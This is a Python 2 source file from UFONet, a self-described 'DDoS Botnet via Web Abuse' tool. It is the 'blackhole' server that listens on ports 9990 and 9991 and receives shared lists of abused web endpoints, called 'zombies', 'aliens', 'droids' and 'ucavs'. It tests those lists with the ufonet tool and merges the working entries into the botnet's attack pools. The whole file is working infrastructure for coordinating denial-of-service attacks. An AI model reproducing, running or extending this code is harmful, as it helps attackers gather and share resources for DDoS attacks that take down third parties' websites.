#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - DDoS Botnet via Web Abuse - 2013/2014/2015/2016 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import socket, re, time, string, sys, urlparse, os, traceback, gzip, shutil, tempfile
from threading import *

class Computer(Thread):
    def __init__(self, parent):
        Thread.__init__(self)
        self.power_on = False
        self.parent = parent
        self.tmp_dir = parent.tmp_dir
        self.target_dir = parent.target_dir

    def find_meat(self):
        self.meats = []
        try:
            for f in os.listdir(self.tmp_dir + "blackhole"):
                if f[-3:] == '.gz':
                    print "[Computer] Found meat in "+str(f)
                    self.meats.append(f)
        except:
            print "[Computer] No meat in the fridge "+self.tmp_dir + "blackhole"
            traceback.print_exc()
        return self.meats != []

    def process( self ):
        zombies_incoming=[]
        aliens_incoming=[]
        droids_incoming=[]
        ucavs_incoming=[]
        for meat in self.meats:
            f_in = gzip.open(self.tmp_dir+"blackhole/"+meat)
            if 'community_zombies.txt.gz' in f_in: # zombies found
                f_out = open(self.tmp_dir+'meat.txt', 'wb')
                for line in f_in.readlines(): 
                    zombies_incoming.append(line)
                    f_out.write(line.strip()+os.linesep)
                f_out.close()
            elif 'community_aliens.txt.gz' in f_in: # aliens found
                f_out = open(self.tmp_dir+'larva.txt', 'wb')
                for line in f_in.readlines(): 
                    aliens_incoming.append(line)
                    f_out.write(line.strip()+os.linesep)
                f_out.close()
            elif 'community_droids.txt.gz' in f_in: # droids found
                f_out = open(self.tmp_dir+'chip.txt', 'wb')
                for line in f_in.readlines(): 
                    droids_incoming.append(line)
                    f_out.write(line.strip()+os.linesep)
                f_out.close()
            elif 'community_ucavs.txt.gz' in f_in: # ucavs found
                f_out = open(self.tmp_dir+'arduino.txt', 'wb')
                for line in f_in.readlines(): 
                    ucavs_incoming.append(line)
                    f_out.write(line.strip()+os.linesep)
                f_out.close()
            f_in.close()
            os.remove(self.tmp_dir+"blackhole/"+meat)
        import subprocess
        f_tmp = open(self.tmp_dir + 'meat.tmp','wb')
        subprocess.call('../ufonet --force-yes -t "'+self.tmp_dir+'meat.txt"', shell=True, stdout=f_tmp) # testing zombies (GET)
        f_tmp.close()
        f_tmp = open(self.tmp_dir + 'meat.tmp')
        testoutput=f_tmp.read()
        f_tmp.close()
        if "Not any zombie active" in testoutput:
            if not aliens_incoming and not droids_incoming and not ucavs_incoming: # not any valid zombie (GET or POST)
                print "[Computer] no valid zombies !"
                return
        else:
            f_tested = open(self.tmp_dir+'meat.txt')
            zombies_community = f_tested.readlines()
            f_tested.close()
            o_in = gzip.open(self.target_dir+'abductions.txt.gz', 'rb')
            zombies_army = o_in.readlines()
            initial = len(zombies_army)
            o_in.close()
            for zombie in zombies_community:
                if zombie.strip() not in zombies_army:
                    zombies_army.append(zombie)
                else:
                    pass
            fc = gzip.open(self.tmp_dir+'newzombies.txt.gz', 'wb')
            for zombie in zombies_army:
                fc.write(zombie.strip()+os.linesep)
            fc.close()
            shutil.move(self.tmp_dir+'newzombies.txt.gz', self.target_dir+'abductions.txt.gz')
            print "[Computer] Zombies tested : " +str(len(zombies_community)) + " / initial : " +str(initial) + " / final : " + str(len(zombies_army))
            f_tested = open(self.tmp_dir+'larva.txt')
            aliens_community = f_tested.readlines()
            f_tested.close()
            o_in = gzip.open(self.target_dir+'troops.txt.gz', 'rb')
            aliens_army = o_in.readlines()
            initial = len(aliens_army)
            o_in.close()
            for alien in aliens_community:
                if alien.strip() not in aliens_army:
                    aliens_army.append(alien)
                else:
                    pass
            fc = gzip.open(self.tmp_dir+'newaliens.txt.gz', 'wb')
            for alien in aliens_army:
                fc.write(alien.strip()+os.linesep)
            fc.close()
            shutil.move(self.tmp_dir+'newaliens.txt.gz', self.target_dir+'troops.txt.gz')
            print "[Computer] Aliens tested : " +str(len(aliens_community)) + " / initial : " +str(initial) + " / final : " + str(len(aliens_army))
            f_tested = open(self.tmp_dir+'chip.txt')
            droids_community = f_tested.readlines()
            f_tested.close()
            o_in = gzip.open(self.target_dir+'robots.txt.gz', 'rb')
            droids_army = o_in.readlines()
            initial = len(droids_army)
            o_in.close()
            for droid in droids_community:
                if droid.strip() not in droids_army:
                    droids_army.append(droid)
                else:
                    pass
            fc = gzip.open(self.tmp_dir+'newdroids.txt.gz', 'wb')
            for droid in droids_army:
                fc.write(droid.strip()+os.linesep)
            fc.close()
            shutil.move(self.tmp_dir+'newdroids.txt.gz', self.target_dir+'robots.txt.gz')
            print "[Computer] Droids tested : " +str(len(droids_community)) + " / initial : " +str(initial) + " / final : " + str(len(droids_army))
            f_tested = open(self.tmp_dir+'arduino.txt')
            ucavs_community = f_tested.readlines()
            f_tested.close()
            o_in = gzip.open(self.target_dir+'drones.txt.gz', 'rb')
            ucavs_army = o_in.readlines()
            initial = len(ucavs_army)
            o_in.close()
            for ucav in ucavs_community:
                if ucav.strip() not in ucavs_army:
                    ucavs_army.append(ucav)
                else:
                    pass
            fc = gzip.open(self.tmp_dir+'newucavs.txt.gz', 'wb')
            for ucav in ucavs_army:
                fc.write(ucav.strip()+os.linesep)
            fc.close()
            shutil.move(self.tmp_dir+'newucavs.txt.gz', self.target_dir+'drones.txt.gz')
            print "[Computer] Drones tested : " +str(len(ucavs_community)) + " / initial : " +str(initial) + " / final : " + str(len(ucavs_army))

    def run(self):
        self.power_on = True
        print "[Computer] Power On"
        while self.power_on :
            # load list of files to process
            if self.find_meat():
                # if data -> process
                self.process()
            time.sleep(5)
        print "[Computer] Power Off"

class BlackRay(Thread):
    def __init__(self, parent):
        Thread.__init__(self)
        self.parent = parent
        self.active = False
        self.sock = None
        self.shining = False

    def run( self ):
        conn = None
        addr = None
        self.sock = self.parent.try_bind(9991)
        if self.sock is not None:
            self.sock.listen(1)
            print '[BlackRay] Emitting on port 9991'
            self.shining = True
        else:
            print '[BlackRay ERROR] Failed to emit on port 9991'
        while self.shining:
            try:
                conn,addr = self.sock.accept()
                print '[BlackRay] Got connection from', addr
            except socket.timeout:
                pass
            except socket.error, e:
                if self.shining == False:
                    print "[BlackRay] Socket Error /return : "+str(e)
                    return
                else:
                    print "[BlackRay] Socket Error /break : "+str(e)
                    break
            else:
                data = conn.recv(1024)
                if data : 
                    if data[0:4] == "SEND" :
                        print "[BlackRay] Meat ready : "+data[5:]
                conn.close()
        print '[BlackRay] End of emission'
        self.sock.close()

class Eater(Thread):
    def __init__(self, client, parent):
        Thread.__init__(self)
        self.client = client
        self.parent = parent

    def run(self):
        print '[Eater] Yum... got meat'
        zombie_meat = "community_zombies.txt.gz"
        alien_meat = "community_aliens.txt.gz"
        droid_meat = "community_droids.txt.gz"
        ucav_meat = "community_ucavs.txt.gz"
        while 1:
            data = self.client.recv(1024)
            if not data:
                break
        if zombie_meat in data: # get zombies
            r = re.compile(".*("+zombie_meat+").*") # regex magics
            meat_type = r.search(data)
            m = meat_type.group(1)
            f = open(self.parent.tmp_dir+"blackhole/"+m,"wb")
            f.write(data)
            print '\n[Eater] Got "%s Closing media transfer"' % f.name
            f.close()
        elif alien_meat in data: # get aliens
            r = re.compile(".*("+alien_meat+").*") # regex magics
            meat_type = r.search(data)
            m = meat_type.group(1)
            f = open(self.parent.tmp_dir+"blackhole/"+m,"wb")
            f.write(data)
            print '\n[Eater] Got "%s Closing media transfer"' % f.name
            f.close()
        elif droid_meat in data: # get zombies
            r = re.compile(".*("+droid_meat+").*") # regex magics
            meat_type = r.search(data)
            m = meat_type.group(1)
            f = open(self.parent.tmp_dir+"blackhole/"+m,"wb")
            f.write(data)
            print '\n[Eater] Got "%s Closing media transfer"' % f.name
            f.close()
        elif ucav_meat in data: # get ucavs
            r = re.compile(".*("+ucav_meat+").*") # regex magics
            meat_type = r.search(data)
            m = meat_type.group(1)
            f = open(self.parent.tmp_dir+"blackhole/"+m,"wb")
            f.write(data)
            print '\n[Eater] Got "%s Closing media transfer"' % f.name
            f.close()
        self.client.close()
        self.parent.eater_full(self)

class Absorber(Thread):
    def __init__(self, parent):
        Thread.__init__(self)
        self.parent = parent
        self.overflow = True
        self._eaters = []
        self.tmp_dir = parent.tmp_dir
        self.sock = False

    def run( self ):
        self.sock = self.parent.try_bind(9990)
        if self.sock is not None:
            self.sock.listen(1)
            print '[Absorber] Ready to feed on port 9990'
            self.overflow = False
        else:
            print '[Absorber ERROR] Failed to listen on port 9990'
        while not self.overflow:
            try:
                conn,addr = self.sock.accept()
                print '[Absorber] Got connection from', addr
            except socket.timeout:
                pass
            except socket.error, e:
                if self.hungry == False:
                    print "[Absorber] Socket Error /return : "+str(e)
                    return
                else:
                    print "[Absorber] Socket Error /break : "+str(e)
                    break
            else:
                t = Eater(conn, self)
                t.start()
                self._eaters.append(t)
        self.sock.close()
        print '[Absorber] Dinner time is over'

    def eater_full(self, _thread):
        self._eaters.remove(_thread)

class BlackHole ( Thread ):
    def __init__(self):
        Thread.__init__( self )
        self.daemon = True
        self.awake = True
        self.tmp_dir = "/tmp/"
        self.target_dir = '/var/www/ufonet/' 
        self.blackray = None
        self.absorber = None
        self.computer = None

    def dream(self):
        if not os.path.exists(self.target_dir+"abductions.txt.gz"):
            abductions_fail = 0
            try:
                fc = gzip.open(self.target_dir+'abductions.txt.gz', 'wb')
                fc.close()
            except:
                print "[Error] not abductions.txt.gz file in "+self.target_dir
                abductions_fail = abductions_fail + 1
        else:
            abductions_fail = 0
        if not os.path.exists(self.target_dir+"troops.txt.gz"):
            troops_fail = 0
            try:
                fc = gzip.open(self.target_dir+'troops.txt.gz', 'wb')
                fc.close()
            except:
                print "[Error] not troops.txt.gz file in "+self.target_dir
                troops_fail = troops_fail + 1
        else:
            troops_fail = 0
        if not os.path.exists(self.target_dir+"robots.txt.gz"):
            robots_fail = 0
            try:
                fc = gzip.open(self.target_dir+'robots.txt.gz', 'wb')
                fc.close()
            except:
                print "[Error] not robots.txt.gz file in "+self.target_dir
                robots_fail = robots_fail + 1
        else:
            robots_fail = 0
        if not os.path.exists(self.target_dir+"drones.txt.gz"):
            drones_fail = 0
            try:
                fc = gzip.open(self.target_dir+'drones.txt.gz', 'wb')
                fc.close()
            except:
                print "[Error] not drones.txt.gz file in "+self.target_dir
                drones_fail = drones_fail + 1
        else:
            drones_fail = 0
        if not os.access(self.target_dir+"abductions.txt.gz",os.W_OK):
            print "[Error] write access denied for abductions file in "+self.target_dir
            abductions_fail = abductions_fail + 1
        if not os.access(self.target_dir+"troops.txt.gz",os.W_OK):
            print "[Error] write access denied for troops file in "+self.target_dir
            troops_fail = troops_fail + 1
        if not os.access(self.target_dir+"robots.txt.gz",os.W_OK):
            print "[Error] write access denied for robots file in "+self.target_dir
            robots_fail = robots_fail + 1
        if not os.access(self.target_dir+"drones.txt.gz",os.W_OK):
            print "[Error] write access denied for drones file in "+self.target_dir
            drones_fail = drones_fail + 1
        if abductions_fail > 0 and troops_fail > 0 and robots_fail > 0 and drones_fail > 0:
            print "[Error] cannot found any zombies container. Aborting..."
            print "[Info] suspend blackhole with: Ctrl+z"
            sys.exit(2)
        if self.consume():
            os.mkdir(self.tmp_dir + "blackhole")
        else:
            print "[Blackhole Error] unable to consume in "+self.tmp_dir+"blackhole..."
            sys.exit(2)
        if not os.path.isdir(self.tmp_dir + "blackhole"):
            print "[Blackhole Error] unable to create "+self.tmp_dir+"blackhole..."
            sys.exit(2)
        self.blackray = BlackRay(self)
        self.absorber = Absorber(self)
        self.computer = Computer(self)
        self.awake = False
        print "[Blackhole] Having sweet dreams..."

    def consume(self):
        if os.path.isdir(self.tmp_dir + "blackhole"):
            try:
                shutil.rmtree(self.tmp_dir + "blackhole")
            except OSError, e:
                print "[Blackhole Error] unable to consume : " + str(e)
                return False
        return True

    def try_bind(self, port):
        s=None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.bind(('', port))
        except socket.error as e:
            if e.errno == 98: # if is in use wait a bit and retry
                time.sleep(3)
                return self.try_bind(port)
            print("[Blackhole Warning] socket busy, connection failed on port " + str(port))
        return s

    def run(self):
        self.dream()
        try:
            self.blackray.start()
            self.absorber.start()
            self.computer.start()
            if not self.blackray.shining or self.absorber.overflow or not self.computer.power_on:
                print "[BlackHole] Advancing time in another space (waiting for server)"+os.linesep
                time.sleep(1)
            while not self.blackray.shining or self.absorber.overflow or not self.computer.power_on:
                time.sleep(1)
            print "\n[BlackHole] all up and running"
            while self.blackray.shining and not self.absorber.overflow and self.computer.power_on:
                time.sleep(1)
        except:
            traceback.print_exc()
        self.awaken()
        print "[Blackhole] Lifespan is up..."

    def collapse(self):
        self.blackray.shining = False
        self.absorber.overflow = True
        self.computer.power_on = False
        self.computer.join()
        self.blackray.join()
        self.absorber.join()

    def awaken(self):
        self.consume()
        self.collapse()
        self.awake = True

if __name__ == "__main__":
    try:
        print("\nInitiating void generation sequence...\n")
        print '='*22 + '\n'
        app = BlackHole()
        app.start()
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("\nTerminating void generation sequence...\n")
        app.collapse()
    except Exception, e:
        traceback.print_exc()
        print ("\n[Error] - Something wrong creating blackhole...!\n")
